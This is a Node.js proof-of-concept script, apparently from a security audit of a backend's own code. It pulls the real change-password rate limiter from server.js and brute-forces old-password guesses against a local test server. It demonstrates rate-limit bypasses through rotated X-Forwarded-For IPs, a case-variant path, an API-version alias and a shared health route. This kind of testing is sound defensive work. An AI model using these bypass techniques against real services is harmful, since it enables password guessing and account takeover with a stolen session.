// Reproduces a brute-force of the OLD password on POST /auth/provider/change-password
// under the REAL changePasswordLimiter config text lifted from server.js (not a copy).
process.env.NODE_ENV = 'development'; delete process.env.CI; delete process.env.DISABLE_AUTH_RATE_LIMIT;
const B = '/home/ubuntu/work/wt-norec/apps/backend/';
const fs = require('fs');
const express = require(B + 'node_modules/express');
const rateLimit = require(B + 'node_modules/express-rate-limit');
const bcrypt = require(B + 'node_modules/bcryptjs');
const { getRequestIp, attachClientIp } = require(B + 'utils/client-ip');
const src = fs.readFileSync(B + 'server.js', 'utf8');
const grab = (re) => { const m = src.match(re); if (!m) throw new Error('not found ' + re); return m[0]; };
const code = [
  grab(/function parsePositiveInt[\s\S]*?\n}\n/),
  grab(/function shouldSkipAuthRateLimit[\s\S]*?\n}\n/),
  grab(/function authRateLimitHandler[\s\S]*?\n}\n/),
  grab(/const changePasswordLimiter = rateLimit\(\{[\s\S]*?\n\}\);/),
  'return changePasswordLimiter;',
].join('\n');
const changePasswordLimiter = new Function('rateLimit', 'getRequestIp', 'process', code)(rateLimit, getRequestIp, process);

const hash = bcrypt.hashSync('Correct-Old-Pass#2026', 4);
const app = express();
app.use(express.json());
app.use(attachClientIp);
for (const prefix of ['/api', '/api/v1']) {           // same mount shape as server.js:323-324
  app.use(`${prefix}/auth/health/change-password`, changePasswordLimiter);
  app.use(`${prefix}/auth/provider/change-password`, changePasswordLimiter);
}
const handler = (req, res) => {                       // stands in for authenticateProvider + changeOwnPassword
  if (req.headers['x-session'] !== 'stolen-live-session') return res.status(401).json({ code: 'NO_TOKEN' });
  const ok = bcrypt.compareSync(String(req.body.oldPassword || ''), hash);
  return ok ? res.json({ success: true }) : res.status(400).json({ code: 'INVALID_CREDENTIALS' });
};
const r = express.Router(); r.post('/change-password', handler);
app.use('/api/auth/provider', r); app.use('/api/v1/auth/provider', r);
app.use('/api/auth/health', r);

const srv = app.listen(0, '127.0.0.1', async () => {
  const port = srv.address().port;
  const hit = async (path, oldPassword, ip) => {
    const res = await fetch(`http://127.0.0.1:${port}${path}`, { method: 'POST',
      headers: { 'content-type': 'application/json', 'x-session': 'stolen-live-session', ...(ip ? { 'x-forwarded-for': ip } : {}) },
      body: JSON.stringify({ oldPassword, newPassword: 'New-Strong-Pass#2026' }) });
    return res.status;
  };
  const P = '/api/auth/provider/change-password';
  const seq = [];
  for (let i = 1; i <= 12; i++) seq.push(await hit(P, 'guess-' + i, '203.0.113.10'));
  console.log('A same client IP, 12 wrong guesses       :', seq.join(' '));
  console.log('A same IP, correct old pw after the cap  :', await hit(P, 'Correct-Old-Pass#2026', '203.0.113.10'));
  console.log('B same IP, case-variant path             :', await hit('/api/auth/provider/CHANGE-PASSWORD', 'x', '203.0.113.10'));
  console.log('B same IP, /api/v1 alias                 :', await hit('/api/v1/auth/provider/change-password', 'x', '203.0.113.10'));
  console.log('B same IP, the health door (shared key)  :', await hit('/api/auth/health/change-password', 'x', '203.0.113.10'));
  const seq2 = [];
  for (let i = 1; i <= 11; i++) seq2.push(await hit(P, 'more-' + i, '198.51.100.20'));
  console.log('C SAME session, second client IP, 11 wrong:', seq2.join(' '));
  const seq3 = [];
  for (let i = 1; i <= 3; i++) seq3.push(await hit(P, i === 3 ? 'Correct-Old-Pass#2026' : 'z' + i, '192.0.2.30'));
  console.log('C third IP: 2 wrong then correct          :', seq3.join(' '));
  const ctl = []; for (let i = 1; i <= 12; i++) ctl.push(await hit(P, 'Correct-Old-Pass#2026', '192.0.2.99'));
  console.log('D control: 12 correct from a fresh IP     :', ctl.join(' '), '(successes not counted)');
  srv.close();
});
